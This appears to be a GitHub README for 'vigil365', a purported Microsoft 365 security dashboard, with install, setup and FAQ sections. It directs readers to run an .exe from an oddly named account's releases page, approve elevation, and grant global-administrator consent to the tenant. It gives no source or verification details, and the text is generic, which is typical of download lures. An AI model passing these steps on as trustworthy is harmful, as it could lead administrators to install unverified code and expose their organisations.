# 🛡️ vigil365 - Secure your Microsoft 365 environment easily

[![](https://img.shields.io/badge/Download-vigil365-blue.svg)](https://github.com/Incoming-andrederain392/vigil365/releases)

Vigil365 helps you manage the security of your Microsoft 365 workspace. It gathers data from tools like Defender XDR, Entra ID, and Intune into one screen. You see all alerts, device health, and user access logs without switching between different tabs. This tool makes security monitoring simple for anyone who manages a business network.

## 📋 What this tool does

Managing security across multiple Microsoft services takes time. Vigil365 centralizes this information.

- **Defender XDR integration:** Tracks threats across your email, devices, and user accounts.
- **Entra ID Protection:** Flags risky logins and unauthorized attempts on user accounts.
- **Intune oversight:** Shows your device compliance status and current update levels.
- **Compliance tracking:** Helps you identify potential configuration gaps in your setup.
- **Central dashboard:** Combines all these details into one layout.

## 🖥️ System Requirements

Ensure your computer meets these requirements before you start.

- **Operating System:** Windows 10 or Windows 11.
- **Memory:** At least 8GB of RAM.
- **Processor:** Dual-core 2.0 GHz or faster.
- **Storage:** 500MB of free disk space.
- **Network:** An active internet connection to pull your Microsoft 365 data.
- **Account Permissions:** You need a global administrator or security administrator role within your Microsoft 365 tenant to authorize the data connection.

## 📥 How to download and install

Follow these steps to set up the software on your machine.

1. Visit the [official releases page](https://github.com/Incoming-andrederain392/vigil365/releases) to view available versions.
2. Look for the file ending in `.exe` under the latest release heading.
3. Click the file name to start the download.
4. Save the file to your desktop or downloads folder.
5. Double-click the file to begin the installation.
6. Follow the prompts on your screen. You may see a prompt from Windows asking if you allow the app to make changes to your device. Click "Yes" to proceed.
7. Once finished, click the shortcut on your desktop to open the dashboard.

## ⚙️ Initial Configuration

When you launch Vigil365 for the first time, you must link it to your Microsoft 365 environment. This allows the application to read your security reports.

1. Click the "Connect Tenant" button on the main screen.
2. Your web browser will open to a Microsoft login page. Sign in with your administrator credentials.
3. Microsoft will ask you to grant read access to Vigil365. These permissions are necessary to display your security data. Review the permissions list and click "Accept."
4. Close the browser window and return to the Vigil365 application.
5. The application will synchronize your data in the background. This may take several minutes if your organization has many devices or user accounts.

## 📊 Using the dashboard

Once your data loads, the main screen shows a summary of your environment.

### Understanding Alerts
The panel at the top shows high-priority issues that require your attention. Click any alert to see details, including the time of the event and the user account involved. If you resolve an issue in Microsoft 365, the alert will update or disappear when the dashboard syncs again.

### Viewing Device Health
Click the Intune tab to see a list of connected devices. You will see which devices are compliant and which require updates. Use the search bar to find specific users or machine names.

### Monitoring Sign-ins
The Entra ID tab highlights unusual sign-in activity. If a user logs in from a location they do not normally visit, the dashboard flags the event. You can investigate these logs to confirm if the activity is legitimate.

## 🔒 Security and Privacy

Vigil365 retrieves data directly from your Microsoft servers to your local computer. It does not send your data to external databases or third-party cloud services. Your security information stays within your network. 

The software uses encrypted connections to talk to the Microsoft Graph API. This ensures that the data moving between your dashboard and Microsoft remains secure from interception.

## 🛠️ Troubleshooting

If you encounter issues, try these steps first.

- **Connection Errors:** Check your internet connection. Ensure your firewall does not block access to the Microsoft Graph API.
- **Data Not Loading:** Restart the application to trigger a fresh sync.
- **Permission Denied:** Ensure you used a Microsoft account with administrative rights. You cannot connect with a standard user account.
- **Performance:** If the dashboard runs slowly, close other memory-intensive applications. Ensure you have the latest updates for Windows installed.

To report a technical issue or request a feature, return to the GitHub repository page and create a new report under the Issues tab. Provide a clear description and any error messages you see on your screen.

## 📃 Frequently Asked Questions

**Does this save my login credentials?**
No. The application uses a secure authentication token provided by Microsoft. It does not store your email or password.

**Can I run this on multiple machines?**
Yes. You can install it on any computer that meets the requirements, provided you sign in with the necessary administrator account.

**How often does the data update?**
The dashboard automatically fetches new data every ten minutes while the application is open. You can click the "Refresh" button at any time to force an immediate update.

**Is this official software?**
Vigil365 is community-driven, open-source software. It interacts with official Microsoft platforms but is not built or maintained by Microsoft.